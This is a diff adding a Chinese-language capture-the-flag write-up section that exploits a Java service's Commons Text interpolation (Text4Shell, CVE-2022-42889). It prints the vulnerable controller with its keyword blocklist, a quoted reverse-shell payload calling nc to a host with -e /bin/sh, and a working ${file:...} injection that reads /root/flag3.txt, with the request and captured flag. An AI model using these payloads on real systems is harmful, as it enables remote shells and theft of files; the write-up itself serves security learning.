@@ -84,3 +84,88 @@ Endpoints:/bonus/source_bak
 ```
 
 ## Flag 3
+
+`POST /admin/localhost:8080%252fbonus%252fsource_bak`，并没有如预期那样拿到 `bonus` 的源码。
+
+`POST /admin/https:%252f%252flocalhost:8080`，拿到了一些没有什么用的东西。
+
+```txt
+not an SSL/TLS record: 485454502f312e3120343030200d0a436f6e74656e742d547970653a20746578742f68746d6c3b636861727365743d7574662d380d0a436f6e74656e742d4c616e67756167653a20656e0d0a436f6e74656e742d4c656e6774683a203433350d0a446174653a205468752c203234204e6f7620323032322031333a35363a343620474d540d0a436f6e6e656374696f6e3a20636c6f73650d0a0d0a3c21646f63747970652068746d6c3e3c68746d6c206c616e673d22656e223e3c686561643e3c7469746c653e48545450205374617475732034303020e280932042616420526571756573743c2f7469746c653e3c7374796c6520747970653d22746578742f637373223e626f6479207b666f6e742d66616d696c793a5461686f6d612c417269616c2c73616e732d73657269663b7d2068312c2068322c2068332c2062207b636f6c6f723a77686974653b6261636b67726f756e642d636f6c6f723a233532354437363b7d206831207b666f6e742d73697a653a323270783b7d206832207b666f6e742d73697a653a313670783b7d206833207b666f6e742d73697a653a313470783b7d2070207b666f6e742d73697a653a313270783b7d2061207b636f6c6f723a626c61636b3b7d202e6c696e65207b6865696768743a3170783b6261636b67726f756e642d636f6c6f723a233532354437363b626f726465723a6e6f6e653b7d3c2f7374796c653e3c2f686561643e3c626f64793e3c68313e48545450205374617475732034303020e280932042616420526571756573743c2f68313e3c2f626f64793e3c2f68746d6c3e; nested exception is io.netty.handler.ssl.NotSslRecordException: not an SSL/TLS record: 485454502f312e3120343030200d0a436f6e74656e742d547970653a20746578742f68746d6c3b636861727365743d7574662d380d0a436f6e74656e742d4c616e67756167653a20656e0d0a436f6e74656e742d4c656e6774683a203433350d0a446174653a205468752c203234204e6f7620323032322031333a35363a343620474d540d0a436f6e6e656374696f6e3a20636c6f73650d0a0d0a3c21646f63747970652068746d6c3e3c68746d6c206c616e673d22656e223e3c686561643e3c7469746c653e48545450205374617475732034303020e280932042616420526571756573743c2f7469746c653e3c7374796c6520747970653d22746578742f637373223e626f6479207b666f6e742d66616d696c793a5461686f6d612c417269616c2c73616e732d73657269663b7d2068312c2068322c2068332c2062207b636f6c6f723a77686974653b6261636b67726f756e642d636f6c6f723a233532354437363b7d206831207b666f6e742d73697a653a323270783b7d206832207b666f6e742d73697a653a313670783b7d206833207b666f6e742d73697a653a313470783b7d2070207b666f6e742d73697a653a313270783b7d2061207b636f6c6f723a626c61636b3b7d202e6c696e65207b6865696768743a3170783b6261636b67726f756e642d636f6c6f723a233532354437363b626f726465723a6e6f6e653b7d3c2f7374796c653e3c2f686561643e3c626f64793e3c68313e48545450205374617475732034303020e280932042616420526571756573743c2f68313e3c2f626f64793e3c2f68746d6c3e
+```
+
+原来 Bonus 的源码是在 `POST /admin/localhost:8080%252fsource_bak` 这里。
+
+```java
+import org.apache.commons.text.StringSubstitutor;
+
+@RestControllerpublic
+class BonusController {
+  @RequestMapping("/bonus")
+  public QueryBean bonus(QueryBean queryBean) {
+    if (queryBean.getType().equals("CommonsText")) {
+      StringSubstitutor interpolator = StringSubstitutor.createInterpolator();
+      interpolator.setEnableSubstitutionInVariables(true);
+      String value = replaceUnSafeWord(queryBean.getValue());
+      String resultValue = interpolator.replace(value);
+      queryBean.setValue(resultValue);
+    } else {
+      // flag3藏在/root/flag3.txt等待你发现
+    }
+    return queryBean;
+  }
+
+  public static String replaceUnSafeWord(String txt) {
+    String resultTxt = txt;
+    ArrayList<String> unsafeList = new ArrayList<String>(Arrays.asList("java", "js", "script", "exec",
+        "start", "url", "dns", "groovy", "bsh", "eval", "ognl"));
+    Iterator<String> iterator = unsafeList.iterator();
+    String word;
+    String replaceString;
+    while (iterator.hasNext()) {
+      word = iterator.next();
+      replaceString = "";
+      resultTxt = resultTxt.replaceAll("(?i)" + word, replaceString);
+    }
+    return resultTxt;
+  }
+}
+```
+
+这里用了 `StringSubstituor`，因此可以使用 `Text4Shell` 来攻击。但需要绕过 `replaceUnSafeWord` 中的关键词过滤。
+
+我们需要的是获取到 `/root/flag3.txt` 这个文件。事实上这并不需要通过 `${script:javascript:java.lang.Runtime.getRuntime().exec('nc 192.168.49.1 9090 -e /bin/sh')}` 这样的方式。因为我们可以直接：
+
+`​${file:UTF-8:/root/flag3.txt}`
+
+```txt
+> GET /admin/localhost:8080%252fbonus HTTP/2
+> Host: prob08-sxvykf68.geekgame.pku.edu.cn
+> user-agent: insomnia/2022.4.2
+> content-type: multipart/form-data; boundary=X-INSOMNIA-BOUNDARY
+> accept: */*
+> content-length: 236
+
+* STATE: DO => DID handle 0x302605bc7008; line 2077 (connection #2)
+* multi changed, check CONNECT_PEND queue!
+* STATE: DID => PERFORMING handle 0x302605bc7008; line 2196 (connection #2)
+
+| --X-INSOMNIA-BOUNDARY
+| Content-Disposition: form-data; name="type"
+| CommonsText
+| --X-INSOMNIA-BOUNDARY
+| Content-Disposition: form-data; name="value"
+| Content-Type: text/plain
+| ${file:UTF-8:/root/flag3.txt}
+| --X-INSOMNIA-BOUNDARY--
+```
+
+利用任意文件读取的方式获取到 Flag 3：
+
+```json
+{"type":"CommonsText", "value":"flag{e088175f-71cd-4841-96fe-40092ddfdd23}"}
+```
+
+## 参考资料
+
+- [Text4Shell漏洞技术分析，交易所等机构需注意](https://www.panewslab.com/zh/articledetails/ksvtl9328dg5.html)
+- [text4shell CVE-2022-42889 poc](https://www.ddosi.org/cve-2022-42889/)
